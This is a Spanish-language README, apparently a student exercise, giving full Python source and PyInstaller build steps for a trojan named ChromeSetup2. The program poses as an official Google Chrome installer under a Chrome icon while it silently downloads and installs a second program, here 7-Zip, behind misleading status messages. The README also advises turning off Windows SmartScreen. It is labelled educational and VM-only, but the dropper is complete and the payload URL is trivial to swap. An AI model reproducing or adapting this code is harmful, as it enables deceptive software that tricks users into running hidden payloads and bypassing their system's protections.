# README - Troyano ChromeSetup2

Este proyecto crea un ejecutable (`ChromeSetup2.exe`) que simula instalar Google Chrome mientras instala 7-Zip en segundo plano.

## Requisitos

- Máquina virtual con Windows 10.
- Python 3.x instalado.
- Módulos: `requests` y `pyinstaller` (`pip install requests pyinstaller`).
- Conexión a internet.

## Pasos

1. **Crear el script**

   - Copia este código en un archivo llamado `trojan.py`:

     ```python
     import os, requests, subprocess, time, sys

     CHROME_URL = "https://dl.google.com/chrome/install/ChromeSetup.exe"
     SEVENZIP_URL = "https://www.7-zip.org/a/7z2301-x64.exe"
     CHROME_PATH = os.path.join(os.getenv("TEMP"), "ChromeSetup.exe")
     SEVENZIP_PATH = os.path.join(os.getenv("TEMP"), "7zipSetup.exe")

     def download_file(url, filename):
         print(f"Preparando la descarga de {os.path.basename(filename)}...")
         response = requests.get(url, stream=True)
         with open(filename, "wb") as file:
             for chunk in response.iter_content(chunk_size=8192):
                 file.write(chunk)
         print(f"Descarga completada.")

     def install_chrome():
         if os.path.exists(CHROME_PATH):
             print("Iniciando la instalación de Google Chrome...")
             subprocess.Popen(CHROME_PATH)
         else:
             print("Error: No se pudo encontrar el instalador de Chrome.")
             sys.exit(1)

     def install_7zip_silently():
         if os.path.exists(SEVENZIP_PATH):
             print("Configurando componentes adicionales...")
             subprocess.Popen([SEVENZIP_PATH, "/S"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         else:
             print("Error: No se pudo encontrar el instalador de 7-Zip.")
             sys.exit(1)

     def main():
         print("Bienvenido al Instalador de Google Chrome")
         print("Versión oficial - Descargando desde Google...\n")
         time.sleep(1)
         download_file(CHROME_URL, CHROME_PATH)
         download_file(SEVENZIP_URL, SEVENZIP_PATH)
         install_chrome()
         time.sleep(2)
         install_7zip_silently()
         print("\nLa instalación de Google Chrome ha comenzado.")
         time.sleep(3)

     if __name__ == "__main__":
         main()
     ```

2. **Descargar un ícono**

   - Descarga un ícono de Chrome (`.ico`) y guárdalo como `chrome.ico` en la misma carpeta que `trojan.py`.

3. **Compilar el ejecutable**

   - Abre una terminal en la carpeta de `trojan.py`.
   - Ejecuta:
     ```
     pyinstaller --onefile --icon=chrome.ico --name ChromeSetup2 trojan.py
     ```
   - Encuentra `ChromeSetup2.exe` en la carpeta `dist`.

4. **Probar en la máquina virtual**

   - Copia `ChromeSetup2.exe` a la máquina virtual con Windows 10.
   - Haz doble clic para ejecutarlo.
   - Chrome se instalará visiblemente y 7-Zip se instalará en silencio.

5. **Verificar**
   - Busca "7-Zip" en el menú de inicio para confirmar la instalación.

## Notas

- Solo para uso educativo en un entorno controlado.
- Windows SmartScreen podría bloquearlo; desactívalo temporalmente para pruebas.

---
